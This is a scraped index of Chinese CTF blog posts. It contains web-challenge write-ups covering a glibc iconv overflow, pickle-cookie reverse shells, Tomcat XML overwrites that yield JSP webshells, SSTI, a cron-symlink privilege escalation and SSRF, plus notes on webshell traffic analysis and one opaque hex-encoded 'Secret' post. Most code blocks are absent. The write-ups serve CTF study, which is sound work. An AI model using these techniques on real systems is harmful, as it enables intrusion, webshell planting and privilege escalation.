这里会出现什么问题呢，直接转换成四字节，就有可能会对我们的iconv所限制的空间产生溢出。 一个简单的poc： 其中hexdump就是打印出输出的字节，没有其他含义。 主要看我们的main函数。main这里的input是一个AAAAA劄，其中这个劄我们利用python来打印一下他的字节： 原本是一个三字节的字符，但是经过该字符集转换后会转换成四字节的输出。 因此即使限制了soutput为strlen(input)，也就是8的时候，也会溢出一字节。编译并运行该poc会得到如下的结果： 可以看到我们确实溢出了1bytes。 要想将其利用，我们还得需要php heap(php堆)，简单地说就是读取/proc/self/maps，并且从中提取到PHP堆地址和libc库文件名，接着下载libc二进制文件并得到system函数的地址并且打rce即可。 简单复现 简单去vulhub下一个docker镜像复现一下exp即可 exploit： 依赖安装 去vulhub下载一个docker-compose.yml部署，或者自己部署一个，把index.php改成这个： 可以读取/etc/passwd文件。 使用payload： 由于我的docker是在本机(windows)上开的，所以我打算在docker内部安装并且执行exp.py，此时又要将一些安装python3和pip的小知识了： 安装完之后就能用python3了 一键利用： "},{"title":"羊城杯2024web方向题解与复现","date":"2024-08-31T17:07:25.000Z","url":"/posts/3830.html","tags":[["Web","/tags/Web/"]],"categories":[["CTF","/categories/CTF/"]],"content":"8.27偶遇粤港澳大湾区羊城杯，全是知识盲区强如战神，拼尽全力无法战胜。 还是太菜了，这里给出官方的羊城杯复现环境： 锐评一下web，出的都很有意思，ez_java我觉得挺好玩，但是也挺折磨的，当时没打通，放置了半个晚上回去用同样的payload打通了，百思不得其解。lyrics for you 这题还行，学弟们做的七七八八，我负责收尾工作写payload。 tomtom2和他的revenge题没有怎么看，因为前面说了被ez_java卡了半个晚上。拼尽全力制作出它的非预期解，这两题都出在我的知识盲点上了，比较可以拿来学习。照相馆根本没看，故不做评价，除了非预期比较难绷。 Lyrics for you 发现似乎是直接读文件，尝试任意文件读取： 可行，尝试读flag： 不行，换个思路读app，我们要知道app运行在了哪个地方，先读/proc/1/cmdline 读到app.py： 关键逻辑就是/board，能进行一个pickle，pickle存在了cookie里，并且对cookie进行了check。这里本地pip install没有找到cookie这个module，可以推测cookie是自己写的一个实现。查看cookie.py： 有了源码之后我们就能够自定义cookie了，关键就是secret在哪。 可以看到app.py里的secret_code是从config.secret_key里导入的，可以得出路径在/usr/etc/app/config/secret_key.py里： 接下来只需要按照cookie.py里的加密逻辑加密我们的pickle即可，由于无回显，打反弹shell，记得waf过滤了R。 直接往/board里打cookie即可，这样shell就能弹过来了： ez_java 最拖时间的题目，传统美德。 拿到源码一眼顶针打jackson，但是能用的链子全部被ban，包括能够触发jackson的链子也都断了。 给了一个userBean，盲猜有用，发现userBean里定义了一个去奇怪的函数getGift，是一个getter，能够用jackson触发。 尝试用jrmp，但是不行。本来就没有办法，如果用jrmp随便就能打穿的话这题就没啥意义了。 似乎没啥出路了，这里只能去搜一下addurl是干啥的，没想到让我找到了一篇新文章： 真的很像了，卧槽，都是这个addURL来打的。通过addURL加载远程类从而进行rce。 这边就有新思路了： Jackson -&gt; getter -&gt; getGift加载远程jar包 但是怎么打jackson呢？  Z3r4y师傅的京麟ctf里看见了个新路线： 抄它的代码： 但是连不上vps，没打成功，哪出问题了呢？ 这里卡了我很长很长时间，绷不住了。jar包里readObject和static都分别试过了，就是没合在一起试，真tm的出生。 jar包： idea里编译成.class文件后再去用jar直接打包成.jar 先按先知那篇文章的打法用jackson触发getter把jar包加载进classpath里： 这样，然后往/ser里打这个payload。这样能把evil.jar加载进去。然后再直接反序列化触发evil里的readObject就可以了： 第二次发上面这个的exp，shell就能弹过来了： tomtom2 这个题目给了一个/read路由，从/read路由里能够读取到xml，从他给的/env路由里可以得到当前tomcat的存放路径存放在/opt/tomcat，问题是只限定读取.xml后缀文件。 说到读取xml，第一时间想到了读取web.xml，但是提示非法的文件名。说明我们不能够读取web.xml。所以只能换个思路读取 在tomcat下，它的配置文件共有4个： context.xml web.xml server.xml tomcat-users.xml 留个伏笔，先讲一下这四个xml是来干嘛的： web.xml web.xml是应用程序描述文件。在java工程中，web.xml用来初始化工程配置信息，例如欢迎页，错误页等。在我看来基本上就是用于配置web路由的，一个最普通的样例web.xml如下： 这里定义了servlet-mapping也就是我们的映射。&lt;servlet-mapping&gt;标签下定义的&lt;servlet-name&gt;内容就是我们&lt;servlet&gt;标签下对应的&lt;servlet-name&gt;，代表着用该对应名字的servlet进行处理。 而&lt;servlet-mapping&gt;标签下的&lt;url-pattern&gt;内容代表着映射到xxx下。&lt;servlet&gt;标签下的&lt;servlet-class&gt;的内容代表着使用某个类下的内容进行处理。(是写好的自定义servlet处理方式或者是官方的servlet配置) 如果我们需要添加一个新映射，就可以通过修改web.xml进行，并且一旦文件被修改了，就会立刻重新加载这个文件而不用重启服务器。 server.xml &amp; context.xml context.xml是tomcat公用的上下文环境配置。 context.xml的基本结构如下： 可以看到还是能够配置servlet以及映射的。 这里讲一下一个比较特别的valve组件，给出的示例是利用valve来写记录日志： 如果需要记录user-agent只需要改pattern即可： 可以看到这里记录了我们的ua头，并且页面的后缀是jsp，如果我们的ua头里面记录的jsp的代码，就可以被写入到这个/web/www/logs/asd.jsp下。 server.xml也是对tomcat的服务器设置，可以进行端口号设置，添加虚拟机，添加各种listener、filter、valve等组件。 server.xml和context.xml的区别在于，context.xml和web.xml一样，一旦文件被修改了，**就会立刻重新加载这个文件而不用重启服务器。**而server.xml是不可动态重新加载的资源，服务器一旦启动后，要修改这个文件就只能够重启服务器进行重新加载。 tomcat-users.xml 可以查看tomcat的账号密码，默认是注释掉的，要把注释去掉才能生效。 回到本题 这题让我们读取xml文件，禁读web.xml，并且有一个需要登录的路由，不难想到让我们先读tomcat-users.xml获取到tomcat的账号密码。 登录成功后就跳转到了上传，不知道有什么用，burp抓包发现了个path参数 并且测试发现只允许上传xml后缀的文件 默认是/uploads/ 不知道在哪，等下试试。应该是/myapp/uploads/xxx 还真是，看着能传到任意位置。 搜一下tomcat文件上传+xml 第一个github 看一下这个例题(在github里是通过修改web.xml)：RWCTF2022 DesperateCat 找了y4神的博客：  web.xml，能覆盖吗？ 如果能覆盖就能够重新加载jar包，但是我们也写不了jar包。 先试试吧，而且由于题目不给读web.xml，我们不知道能不能覆盖成功，随便写点123，如果成功了tomcat应该会崩溃？ 能传，但是不知道能不能覆盖成功，按道理来说应该是可以的，能写入。 只能写web.xml，能干吗呢？ 只能传xml，如果文件上传是jsp就好了，对应php里只能传一个png文件但是要你rce。 有没有啥办法能让xml解析成jsp?  奇怪的东西，标题是将.jsp改成.php，好像是将/tomcatpool.jsp -&gt; /tomcatpool.php，但实际上应该还是jsp解析。 那反过来说就是说php -&gt; jsp 我们要定义一个servlet来解析jsp啊，服了。有没有现成的jsp处理器  还真有： 可以改一下web.xml了，注意这里是常规的web.xml对servlet的定义： 把它修改成web.xml，这里随便找了一个示例demo的web.xml：  试试把web.xml覆盖 好像可以了，这里放上上传后的对比图，发现原本报错的页面能够正常解析了： 看看能不能解析jsp了： 出了！ 接下来只需要找一个jsp webshell即可： tomtom2-revenge tomtom2阻止我们读取web.xml，但是能够意外地覆盖掉web.xml，所以该revenge题针对web.xml进行了过滤，我们不能够再上传并且覆盖web.xml了。 对于这四个xml，我们就剩下server.xml和context.xml没有用了，其中server.xml不能够进行热加载，所以希望只能够放在覆写context.xml。 还记得我们的valve组件吗，通过覆写context.xml添加valve记录我们的ua头到一个.jsp文件，其中该jsp文件记录下我们的恶意ua头即可执行任意命令。 恶意context.xml： 注意生成的日志文件名字应该为： 在这里，比如你是2024-8-28生成的日志，则日志名字： 由于放在了/myapp下，所以通过/myapp/asd.2024-8-28.jsp访问就能记录下你的ua头。 设置ua头，注意，由于ua头会对引号进行自动转义，包括unicode的转义符号，所以我们的webshell是不能够出现引号的： 这里需要定义Delimiter，一般在我们的java里都是用\\\\A。并且获取到我们的传参键值对。第一个键值对作为exec的内容，第二个键值对作为delimiter因此再往jsp传值： 这里\\要urlencode一下： 网络照相馆 题目提示： 注意hash_file函数 能够通过/url.php进行ssrf： function.php 结合提示可以得到应该是hash_file的猫腻。结合任意文件读取+hash_file，可以想到是通过glibc溢出漏洞来rce： 这里有两个hash_file函数，其中第一个hash_file('md5', $filename)，这个filename是$filename = $baseDir . get_filename(8);，结合get_filename()函数，可以得知左边这个hash_file是写死的。 右边的$value[0]则是通过sql查询的结果，这里sql查询只是一个简单的查询语句，没有做任何的防御。结合$value[0]，这里需要通过sql注入来读取该文件，利用sql注入select ''会返回这个字符串，从而进行glibc溢出攻击，简单修改现成的python脚本即可。 Ubuntu Pastebin 具体修改位置： "},{"title":"Secret","date":"2024-08-21T05:36:32.000Z","url":"/posts/17365.html","tags":[["Web","/tags/Web/"]],"categories":[["CTF","/categories/CTF/"]],"content":" 25f8e7a75a1ac67306db5817fc08d5efd3d6108915e376e58ccaa6e9d6d4b192b151e94796d798afb12c59208e1b359bf0db5bd6af5fa0a462facc48c7157a269c007fc2f8f1083e2e1e0e2d3fd59612dc27673a1f86837477aff1cff94cefe8ffc28e8eb7d57c0c35b38acff8eaf0458176e266914e6cfe5eaea245ef2b1549184a36b543bac55610627ea7c5c8fcf13a828b6c586fd2579b916eb45ec985beb79d7258be2c8e40622c6eecdb6a38d2113407344cb7e023138bc8196e60edb4efd7e7c37947080e644f99ff52fadf83357cadfbb1a77b77cd476a9996f6bc256b30cbc36e7aa390c477f9da36ca620aa64babe84982bd4ad0eec530fa506743ed1bbe78127a263639bc92615f01c2e83a73d55e44aca3c387f43c15890d7c298d0446f64880a5b5281c1124c1401c0301d30cc7ebca99e7edaa2ddf7c815f6f3397e78a8fa95697b1e02cff8300817c9a9f5fb372a5549a267b41587ae8c83094451aa17ecae4d0150a6478ad9a88a79ad43687c301b374fe3789d9b93524c741003e7826a3e25203a17ca6a9c4a09092dc8a3d9dd400a6e9bc693c3ed870425e859d9bb4159df695b4716447bbcd8ca9cbf2969ea16590400db290f8c7d6474c870e6e87a41bb645dce9fb23a51fe4dbe9560911808311d3eb21080a1389dcdd44dc56c9c5092a8195386a68dec2a9f7c38111ad6ebbd0903729f81f2eda237de74ba83c508643d7c32d8ed1c52fed402c458b33aa7b75de5d225e287698d32380bd490f56b983cb92e5562be6b06aff2c278ef4325fc2bb50490d77b25e5e6745f45beef3fe07fd008423947fb5786105d35fd0e1f905ff691faef24dd9c2726f6764f7d0580dd3e16750e99235c6d012d479a67e0dca75e769b5f2f9b9036ced34dc0ce28c669954142f593ee9271ab38f8604993832acb4fafa23cb3959d70b4b1b741c3f48cdb20c07438d9f9c63dca67820abf825e52470476e4f074d51b4bdf766e2d3082e2e9344a50b432b7dc3ba6ef5fc8097c6fdd12adbbb1b7c700140b45bda73c9f9801de11561de8558d2df30bde2d809d0230d3a819ec4503386f477833b80022f9e2c28c9dc2316cc8493f4203f17de8392b703dce9a94cc29264e7d07239f7b4e7ea7e09d151fa81110101a9e4a76981be0387cf2c07f1c11b229fa0780f39434507cdfbcf35764d8211800aa98eb0908d837a032b5ad90a646dc504248d5d76d80dc9126cdee986e28a3cc733e0deeb5972bb4d06b9ce90d6fa9786114aa218f39a6925bc4bfdd815ea8b0e471916f60df9a798bdfcc8a4c30e9cf3bac632ed7a511a31a58e286c0e7acb653347b218e804de6e7dc5012a6fe45bdf368603bbef572cab1ca3f3bd27f5b1cbfe3728f2278aa1824e948572b5279e5a03552a7dd963f6e28f3444dc095d627df2b25681c6f6815e857e2eeeddad96c588013ce1ed95ede9c74a20cb40309918b156252b1f4ae7aa713219f34bccaca46b068e67861f70b1f8a39ee580fe7e73e95b2039264f1bd39e6e602af35558658fbecfd22042775124848791865f40b73329340e9c17e0510478059ddd9229a618aab6d72ddb808d0a174702eed7e9e92ee4d59304dc78857d6d1eff0452e4550d55206f790f780d7b626935e3220237f4560f8904834966852b1ccce5dedb78c1f2a40e480aecfd2514bd0328b2dfd627457be6395bc440c42dad767f94f0a4b8eefcdfe4f6903ea74885ab5bc8f4401d85a15b44d1e27bf01aefb988895bf74fe3b1c7748f0487823c6870947e6274d8470158a6b3181b9a6dc9a8e82b20ba32010e8dfb22b3867552c0c8f5482fb8dde81563ffb7ec3a0c8f1221f72da2f8da6af09db497cf3ec29dde42e86f3113765ebe4d69a6c598a90731241a4dd1279dab4a8f3309b02a962a5060d4e0d4d4f6a7778aaa43b40338b8dd3756f06cfbb117b7f54141c3f736f0bf6824efd20e49e3b3019c1dd34f464b8475d34db3ab46644b22b521e0d5dee8960f6101db929723775fc183f648114a77ee8c10e13764d303fc15eda15d43b0362070b6870bce10d754a04977bd00231f334bad0fa8258358ae8e91dba85804292b41cff38086ae7f56e80465d282cd1184953d045df820f39083bb8cbde6c603fe858a24ec8d4e264f4e8e6b6b1388e0a058b4f9f6cbc8f2a045a155e1ef5fbdfd85d9ccbf918accc36f8fca796315ea6e3e601e1ea7f43e50adb8ad11ce8ed82896e488930004e871034a3de9d788518e5f80b1f4bcc94280f2a640f62844ffe5ed2a5ecf76047aca09ac4c6f7dae5b3ff390bb046c74307da5def2d04202507ddc3dbdb350b0eb7f7fef4f6f3912e82eaf57cd397ecdf1660bdc103553fe2c9822dad62fb6927426df4bf383b77f3908786e4b97808075af13f43727653bf201f9870809c0ab956447ba72d129e5805fa832014c20f680ff8c7b8b696d1a89738882e0c5d7dd7b19e26fad60a9eb252363b3612936c83df9667eeb19eb5d493f13c5f9f8c30cfc59530e1ef430ed28055b797bd64e86be25db30abcab2047d8dece152d1bc77989a54df2591913309d1a540b165b9976d2f05c2ce1ac78f66df68603c924e81b9ddbcc7e0783d3f652dd87f1bdf6354e01e739ffa18bc7c960026d2ec25fe420dec6106e155b574f025560878b444467fe34483c3c9338ad42b97ccda20dd2abfd6773865811a1c372c2a05690ffa7b94fcbfb6b55460d24b4a8c6c08207337e3e9a5732f28899ddf973af3eb76af8d150ef5c6cd556b286a90dac3054341801be611a1652ea1153d860a384346fcda19192dade383736253516106646ac4fe7c7a58a861210dc4e15db142b5cd99e9536c8311c5c7afac252d6778b1818c74c5d6ebf47036560b16f0380cd6d175aaf4d3455438f72ce48fcb1a667e06abdfa84c3b27b2c93a732e5965a3c41ba5c84b1849282abb45133b9f263685e631672fca94dc0eb33ae692b492a6e86714912dd36908af2ec4c5464e7f11dc0d898ed68a8fa248f3d8304bccf86015b882352cc5b237aa7fd0cfb9a5d5b2f3ac9f2e2950820b020b75899eb30b650202e46abe16b9ac1649097d0c19ff8aafbb18a7d8335b0900c4a0d3870db7bb76c9160cc51059dd5579b1d2aec2b3da179fd416613d6838b42aefc0606861647f929b55d66b7e73b2aa1116c9100d40a8247fb62cb86a8a6a033fde8c27c9813c602ab4d524efad617c881d9a4a3a218e48bccb492a939e4607dc6ea98fcf4fffd1047bafaf49213ff402c72b91797a8c06ed778dc935298a1a82968067b676ffb1c2eacfe14dcc4d21c0a3e5535f18bed24f9bfbe3ea800e876cee2df53fb90aa85368cb2e97349a167ddde2f99c6c790ec1bd93bc0eb006de8db4f7695f24f59ffd6b5439912b9e71db5ff54840ddf30dedded5ba264f7cd70ed636d543847296515ec089e40aa1ad1b6363150a1285bd32684a47036caf432913d65da5a0db8ea3d43c5345585475ede4db1c20d1cff080d6f37a6e09d1e156f7ba5693241af7970f0edb396c6aac21d8cc634436c0b063cd5ed8e4ba191fd33ae53f32cb42fd9f1ba81290c9b89652a5f2aabe3c7c411cf8434e747f77052b112ad7af8e7cea298a0f69c1cc5ac5f7b310b4f68d00bd393f367ecadcecda8c06f171603e194add422e36a509d3ad54125ece83f48be05da75ba02a740799b2a40918c8077407f3b67ec9ae1d126c0107fd471c37b5e6a35ccc6f6357f270351684ef933cf9bcf7491a195017c6d609115e4dc65b08da2d485f662ba8b6581d5f0e9d61c4c6bd4b070d6e22273452b74c6151831ab47633a2f3dfb14aed0443ec6ae0f58654ae6cc6f3a0c25793c6aeb096f396dd97d6ed7ca9cd085f25cbed0ed6c6d793f2e033433a858bb182a3b42c95b7dca6ae214a52e46d08ca8699e15b81 Give me password and I will give you secret. "},{"title":"巅峰极客2024部分题解","date":"2024-08-18T02:43:50.000Z","url":"/posts/25143.html","tags":[["Web","/tags/Web/"]],"categories":[["CTF","/categories/CTF/"]],"content":"尽力了，自己还是太菜了 Encircling 普通小游戏，打赢即有flag，前端操作一下就行了。 GoldenHornKing 非预期解 我出的是非预期解。 源码如下： 去查一下就知道了，jinja2.Environment(loader=jinja2.BaseLoader()).from_string(f&quot;&#123;&#123;&#123;&#123; &#123;calc_req&#125; &#125;&#125;&#125;&#125;&quot;).render(&#123;&quot;app&quot;: app&#125;)就是jinja2+fastapi的ssti语句。也就是说我们这里就是打fastapi+jinja2的ssti。示例代码如下： 很像吧。 但是这个题目有限制，无回显+access限制。access的存在使得我们每开启一次就只能打一次payload，如果一次不能成功就只能重启靶机。 所以先本地测试，改成有回显的情况。哦对，还有过滤，过滤数字和%，差点忘了。 本地测试发现不用&#123;&#123;&#125;&#125;包裹就能够打ssti了。 测试payload： 有回显 尝试反弹shell发现payload会带数字，dnslog curl不到。 那现在就是指向一个无回显、不出网、只能打一次限制盲注的情况。 这种情况最好的办法就是打内存马，要打内存马就只能找到添加路由的函数，欸，但是我没找到。 我找的是另一条路，灵感来自于pyjail。 link_here 看到这里灵感瞬间来了，我们lipsum也能够拿到exec，那就是说我们能够篡改任意一个函数。篡改哪个呢？答案不言而喻。 很明显就是这个open，能够返回值显示的，这样不就有回显了吗？ 照猫画虎一下修改open，这里用的是lambda表达式，很好写的： 本地测试： 至于为什么用popen，很简单啊，因为还要调用一个.read()，我们平时做ssti不都是popen('xxx').read()吗，这不就相当于popen('xxx').read()吗 本地测试成功。去远程环境打就可以了： 预期解 Z3r4y师傅的解法，发现了add_api_route可以动态添加一个路由，那payload很简单了： php online 有点炸裂这题，源码如下： 逻辑就是nobody权限用户去执行php代码，nobody的权限比www-data还低。 这里刚开始看到sudo -u www-data python3 init.py，用www-data执行的init.py，便想去尝试读一下这个文件： 发现只是一段很普通的代码： 然后没了，看了很久都没看出来。 比完了问了一下烧卖的师傅们，gztime师傅说用的是条件竞争做的。呜呜，当时没看出来。 在哪竞争呢？其实就是这个sudo -u www-data python3 init.py 它import了logging。在python里同目录下的同名py文件优先于第三方库文件。也就是说我们如果在sandbox里也有一个logging.py，那么它就会先调用我们的logging.py文件。 很显然我们不能够直接将自己的logging.py文件放到sandbox里，因为每次运行都会删掉沙箱里的所有东西。我们先在tmp目录下写，然后sh脚本调用将其循环复制竞争即可。 这样能够不断将logging.py复制到sandboxname目录下，也就是一个沙箱内，此时只需要不断在该沙箱内触发sudo -u www-data python3 init.py即可，随便执行触发。这样能够获取到www-data权限的shell。但是还不够，flag是只有root权限才能够拿到的，我们还得想办法到root权限。 suid没有有用的信息，uname -a也没有有用的信息。但是ps -aux会发现开着定时任务。此时我们要想办法往定时任务里写东西。利用沙箱会cd进沙箱目录然后写phpcode文件的操作，可以将沙箱和定时任务目录软链接起来，然后写的时候就会写入定时任务里了。 然后传定时任务格式的payload就行了： # &lt;?php sleep(10000);?&gt;这里是防止phpcode被删的太快，保证能够写到计划任务里并且执行。最后到/tmp/flag下读flag就可以了 admin_test 这个题也没看，第二天感觉一眼看上去很简单。简单说下思路吧，dirsearch扫到admin.html。是一个上传并且执行命令的界面，传了发现waf，慢慢扫会发现限制了t * . /，跟ctfshow那个临时文件执行差不多： 最后利用find提权就可以了。 ez_java(未解出) 不懂，考的是jdk17下的cb链。去看了rwctf的oldsystem和n1ctf junior的derby plus，那两个一个是低版本下的cb链，一个是高版本下的cb链，都指向了ldapAttribute这条链子，打的是jndi。但是将payload发过去之后发现它还有waf，过滤了org.apache类，有点不会打了。 updated in 2024/8/20 看了wp，发现又是你妈的utf8 overlong encoding，卧槽，三次死在这个上面了。 还有一个比较重要的点，cb一般都会带上cc依赖，而实际测试也基本上是这样： 可以看见org.apache.commons下有beanutils和collections，绷不住了。 而且题目不出网，只能够打内存马，这下反而变简单了。用cc链打一个内存马就行了。但是高版本下没有templatesimpl，我们得找一个新的路线去等效替代。 新路线就是MethodHandles.lookup.defineClass。不由得让我们想到cc3的调用路线，通过InstantiateTransformer调用这个defineClass加载字节码，和cc3类似。 打内存马用springEcho。这里得用Unsafe patch一下module，但是wp没有详细提供。因为jdk17模块化的原因导致有些unnamed的module无法加载，所以有可能要添加参数。 神秘的springEcho： "},{"title":"TFCCTF2024 web方向部分题解","date":"2024-08-11T04:40:22.000Z","url":"/posts/12526.html","tags":[["Web","/tags/Web/"]],"categories":[["CTF","/categories/CTF/"]],"content":"老外的比赛，涨姿势了 safe_content Our site has been breached. Since then we restricted the ips we can get files from. This should reduce our attack surface since no external input gets into our app. Is it safe ? For the source code, go to /src.php 傻逼edge，上次das坑我一次了，这次又来。 src.php如下，一个简单的判断 仔细看就知道逻辑是通过fetchContent来获取到指定url的内容，并且将得到的content放入command里执行。 参考ctfshow周末大挑战 - parseurl | Err0r233，我之前写过的parse_url可以得到host其实是这部分： 第一时间想的是通过这个方式绕过然后打一个反弹shell，将testshell部署在vps上，通过这个ssrf来获取到反弹shell的内容，然后再执行反弹shell。 但是很快就有个问题，那就是报错访问不到，难绷的。 自己试着访问了一下发现会指向localhost/testshell，又因为本地根本没有这玩意，所以就报错了。 这时候有点卡了，就去搜了一下parse_url bypass file_get_contents 发现这篇文章： PHP SSRF Techniques. How to bypass filter_var()… | by theMiddle | Medium 发现php中的data伪协议可以联动parse_url一起使用。 注意看这里的host就是text。这里php伪协议有个特性就是PHP doesn’t care about mime-type…，也就是说我们把text随便换成任意一个东西都可以得到和text一样的结果 那就简单了，但是本题里返回的是b64解密的结果，所以我们要进行二次b64加密就可以了。 本题经测试不出网，无法反弹shell，但是当前目录下有写权限，可以将结果写入到文件里查看 payload： 不要在他的访问框里提交，直接在url里提交即可，不要让他url编码了。执行后访问/test.txt即可： greetings Welcome to our ctf! Hope you enjoy it! Have fun express框架。输入1就返回hello 1，感觉和flask很像。 express模板注入： exp： app.js flag: surfing 随便输什么东西都是这样： 只有google开头才能够有响应。页面f12有提示 题目目的要让我们访问本地8000端口，但是url必须得用google开头。这里有点阻碍 如果能让我们从google跳转到localhost:8000就好了 找到一个很相似的题  payload: 会报错，因为后面带了.png参数 用锚点注释掉： 这里如果将问号这些url编码一下就能过，也可以起一个间接跳转： 绷，google不允许ip跳转 用ngork内网穿透出来即可。ngork自己上官网下载安装到vps上，然后启动隧道就行了，开哪个端口就写哪个 funny This challenge is HILARIOUS! 附件下下来，index.php没有什么可以关注的。附件还给了httpd.conf，可能在暗示我们往apache的洞走，搜一下apache的洞先。 查了下，ddos肯定不可能，解析洞是上传的问题，服务组件提权也不可能，剩下就剩路径穿越了，试试/cgi-bin/。爆403 400: 怎么回事呢 看这个httpd.conf发现了一行比较好玩的东西： 不懂这是什么，但是可以找ai问一下： 简单地说就是将/usr/bin下的东西映射到了/cgi-bin底下，此时我们可以通过/cgi-bin来调用/usr/bin下的东西，众所周知/usr/bin是放命令的地方，相当于可以rce： 当querystring中不包含没有解码的=号的情况下，要将querystring作为cgi的参数传入。 payload： pr 命令是一个 Unix 和 Linux 系统中的命令，用于将文本文件格式化为页码化的输出，通常用于打印。pr 命令可以对文本进行分页、添加页眉、页脚、调整列数等，以便于打印或查看。 这里用pr的原因是pr的输出有换行。其他能执行但是不能输出。在响应包的时候，没有换行的话是不能够显示在body里的，而是显示在header里，数据又不符合http头格式，此时就会报错 sagigram(未完成) Worst model of them all 进去就是一个登录页，其他啥都没有 看到了csrf的token 发现/register能访问，是它的注册页。尝试注册一个账号 登录成功后发现了能够添加admin好友，但是什么用都没有 奇怪的东西出现了，我传一张图片之后它就变成了这样。感觉上它能够提取出图片的文字嵌入到页面当中？ 不懂 flask-destroyer 从附件可以得到是flask+mysql的结合。读dockerfile可知flag放在了这个地方 给了mysql配置： 这里说明我们可以直接写shell 但是又因为是flask的，我们不知道该写啥，那就先往下看 sql注入双引号闭合 登录路由调用了这个函数： 发现报错 尝试写内容，问题是写什么，然后写到哪个路径里 发现这里可以渲染模板，逻辑是这样的，registered_templates是服务初始化时记录下templates目录下的模板，然后进行下面的检查： 如果两个条件都通过就会渲染app/templates下的目录。当然，前提是登录成功。 问题来到registered_templates，他是服务启动时对templates目录下的文件进行了读取，然后保存到这个变量里。我们要怎么做才能够让registered_templates增加新的内容呢？只需要让服务重新启动一遍就行了，也就是说我们要让服务崩溃再重启一次即可。 知道会渲染模板这下就简单了，要写进去的东西就是一个简单的ssti，但是要写到/app/templates下，注意在dockerfile里还有一个/destroyer上级目录。但是难点在于怎么让服务崩溃重启 发现/app/templates 尝试写到这里，检查出字段数为3： payload: 用\\x80让flask崩溃，没懂原理，这个还是从其他地方学来的。 此时服务会崩溃，然后重启之后就会将我们的模板加载进去了。 由于存在sql注入，这里admin的账号密码很容易用万能密码登录 接下来访问 然后去tmp找flag request "},{"title":"流量分析学习","date":"2024-08-01T08:08:29.000Z","url":"/posts/28398.html","tags":[["Misc","/tags/Misc/"]],"categories":[["-CTF Misc","/categories/CTF-Misc/"]],"content":"有关流量分析的学习笔记 TCP/IP是因特网上的标准协议集，它不是针对某一个协议。 学过计网的都知道TCP/IP会分为如下几层： 其中网络接口层一般又分为数据链路层和应用层 怎么和我计网学的不一样呢，考完就忘了 计网里说过，这几层都是自上而下层层封装的。每一层数据都会被包装为PDU scapy scapy就是以PDU的概念制作和分析报文的，仅需简单做个示例： 回显为 usb流量 计算机与usb设备进行通信，同样也会产生流量。 鼠标流量 利用wireshark捕捉鼠标流量只需要用wireshark自带的工具usbpcap进行。 鼠标移动的轨迹、左键、邮件的行为都能够捕捉得到 鼠标设备的数据最少需要3字节，常规的有较短的4字节和正常的8字节。其中4字节： 第一字节是按键掩码(左中右) 第二字节是x轴偏移量(补码) 第三字节是y轴偏移量(补码) 第四字节是滚轮偏移量 8字节的： 第一字节是按键掩码 第三第四字节是x轴偏移量 第五第六字节是y轴偏移量 第七字节是垂直滚轮偏移量 第八字节是水平滚轮偏移量 键盘流量 确定为键盘流量之后也是可以利用tshark直接导出键盘数据，然后利用脚本分析。 键盘流量只记录按下的按键，释放按键不做记录。 理论上键盘仅需三字节即可记录下来： 第一字节是修饰键 第二字节是保留字节 第三字节是映射键 但是正常情况下长度为8字节，其后六个字节都用做映射键的记录。 分析脚本 webshell流量 蚁剑 蚁剑的流量分析基本上很常见了。我自己就写过一个博客来看过，这里简要重新复述一下： 蚁剑最明显的特征： 并且代码和指令是一块发送的： 使用wireshark可以看到传参的值，这里由于是substr(x,2)的关系，所以我们要从第三个字符开始进行base64解密。解密结果如下： 蚁剑的base64 采用base64方式加密shell会发现： 用它来解密就能够得到和先前一样的结果 chr、rot13 大同小异 rsa 毫无规律 冰蝎 马长这样。自己的冰蝎打不开了，所以大致讲一下流程： 冰蝎在连接到服务端的时候会发两个包。第一个包用于确认连接，第二个包用于获取信息。 冰蝎的输入都经过了aes128加密，一般情况下可以通过木马来获取到用于aes128解密的key。 解密网址 解密后会有一段数据： 将data进行b64解密后： 可以看到又有一个base64编码的字符串。content经过decode后发送到了main函数，main函数又重新编码加密后发送。 用于获取信息的第二包： 它回返回一个服务器信息的数组： rce rce的包长这样。 它会返回一段json，大致长这样： msg的内容解密后就是命令执行获取到的结果 细看操作可以得到以下结论： 将payload传入main函数当中 然后判断system、passthru等 函数是否可以使用，并尝试执行。如果不可行回返回fail编码后的结果 如果可行会将结果传入$kWJW变量然后进行安全化处理、编码输出。 然后aes编码退出。 目录读取 还是json套娃。 对yyy解密后会变为： 脚本解码后就能够得到想要的结果 读文件 两次b64解密 下载文件 json结构倒过来 ua特征 所有的ua： user-Angent Mozilla/ 5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/ 537.36 (KHTML, like Gecko) Chrome/ 89.0.4389.114 Safari/ 537.36 Mozilla/ 5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/ 20100101 Firefox/ 87.0 Mozilla/ 5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/ 537.36 (KHTML, like Gecko) Chrome/ 96.0.4664.110 Safari/ 537.36 Mozilla/ 5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/ 537.36 (KHTML, like Gecko) Chrome/ 99.0.4844.74 Safari/ 537.36 Edg/ 99.0.1150.55 Mozilla/ 5.0 (Windows NT 10.0; WOW64) AppleWebKit/ 537.36 (KHTML, like Gecko) Chrome/ 96.0.4664.110 Safari/ 537.36 Mozilla/ 5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/ 20100101 Firefox/ 98.0 Mozilla/ 5.0 (Windows NT 10.0) AppleWebKit/ 537.36 (KHTML, like Gecko) Chrome/ 84.0.4147.125 Safari/ 537.36 Mozilla/ 5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/ 537.36 (KHTML, like Gecko) Chrome/ 84.0.4147.125 Safari/ 537.36 Mozilla/ 5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/ 20100101 Firefox/ 79.0 Mozilla/ 5.0 (Windows NT 6.3; Trident/ 7.0; rv:11.0) like Gecko 都是相对较老的ua头 哥斯拉 测试连接的时候会发三个包 查看后会发现它利用参数发送了下面这条内容： 解密后 其实第一个特征已经出来了，不难看出在PHP_EVAL_XOR_BASE64这个加密器的情况下，哥斯拉会将他的完整shell通过密码参数传入服务器，且每个包都会 第一包 哥斯拉的第一个包： wllm是我们上面传入的马，key解密后会发现它其实是payload，详见哥斯拉流量分析 - 先知社区 (aliyun.com) 第二包 将信息传入payload的run函数 run 传递的参数中会有一定的序列化（格式化），可以参考 formatParameter 函数，不影响解析。 在注入 Session 后的一个流量，会调用 test 函数，即参数 返回值会前后携带固定的 md5 值的前后 16 个字符，与加密逻辑一致。 不过需要注意的是，有时 Godzilla 会使用 gzip 进行压缩以减小数据传输量。 